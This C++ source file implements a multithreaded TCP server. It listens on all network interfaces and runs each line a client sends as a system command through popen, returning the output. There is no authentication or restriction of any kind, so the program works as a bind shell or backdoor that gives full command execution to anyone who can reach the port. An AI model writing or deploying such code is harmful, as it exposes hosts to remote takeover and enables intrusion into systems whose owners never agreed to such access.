#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <mutex>
#include <sstream>

#ifdef _WIN32
  #include <winsock2.h>
  #include <ws2tcpip.h>
  #pragma comment(lib, "ws2_32.lib")
  typedef SOCKET socket_t;
  #define CLOSE_SOCKET closesocket
  #define popen_process _popen
  #define pclose_process _pclose
#else
  #include <sys/types.h>
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>
  #include <unistd.h>
  typedef int socket_t;
  #define INVALID_SOCKET -1
  #define SOCKET_ERROR -1
  #define CLOSE_SOCKET close
  #define popen_process popen
  #define pclose_process pclose
#endif

std::mutex cout_mutex;

void handle_client(socket_t client_sock) {
    std::string prompt = "> ";
    char buf[1024];
    // Interactive shell-like session
    while (true) {
        // Send prompt
        send(client_sock, prompt.c_str(), prompt.size(), 0);
        // Read client input
        int bytes = recv(client_sock, buf, sizeof(buf) - 1, 0);
        if (bytes <= 0) break;
        buf[bytes] = '\0';
        std::string cmd(buf);
        // Trim CRLF
        if (!cmd.empty() && (cmd.back() == '\n' || cmd.back() == '\r')) cmd.pop_back();
        if (cmd == "exit" || cmd == "quit") break;
        {
            std::lock_guard<std::mutex> lock(cout_mutex);
            std::cout << "Executing command from client: " << cmd << std::endl;
        }
        // Execute command via popen
        FILE *pipe = popen_process(cmd.c_str(), "r");
        if (!pipe) {
            std::string err = "Error: failed to run command\n";
            send(client_sock, err.c_str(), err.size(), 0);
            continue;
        }
        char outbuf[512];
        while (fgets(outbuf, sizeof(outbuf), pipe) != nullptr) {
            send(client_sock, outbuf, strlen(outbuf), 0);
        }
        pclose_process(pipe);
    }
    CLOSE_SOCKET(client_sock);
    {
        std::lock_guard<std::mutex> lock(cout_mutex);
        std::cout << "Client disconnected" << std::endl;
    }
}

int main(int argc, char *argv[]) {
#ifdef _WIN32
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);
#endif
    int port = 8081;
    if (argc >= 2) port = std::stoi(argv[1]);

    socket_t server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock == INVALID_SOCKET) {
        std::cerr << "Failed to create socket" << std::endl;
        return 1;
    }

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    if (bind(server_sock, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        std::cerr << "Bind failed" << std::endl;
        return 1;
    }

    if (listen(server_sock, 5) == SOCKET_ERROR) {
        std::cerr << "Listen failed" << std::endl;
        return 1;
    }

    std::cout << "TCP server listening on port " << port << std::endl;

    std::vector<std::thread> threads;
    while (true) {
        sockaddr_in client_addr{};
        socklen_t client_len = sizeof(client_addr);
        socket_t client_sock = accept(server_sock, (sockaddr*)&client_addr, &client_len);
        if (client_sock == INVALID_SOCKET) continue;

        {
            std::lock_guard<std::mutex> lock(cout_mutex);
            std::cout << "Accepted connection from "
                      << inet_ntoa(client_addr.sin_addr)
                      << ":" << ntohs(client_addr.sin_port) << std::endl;
        }
        // Launch thread
        threads.emplace_back(handle_client, client_sock);
        // Detach to allow independence
        threads.back().detach();
    }

    CLOSE_SOCKET(server_sock);
#ifdef _WIN32
    WSACleanup();
#endif
    return 0;
}
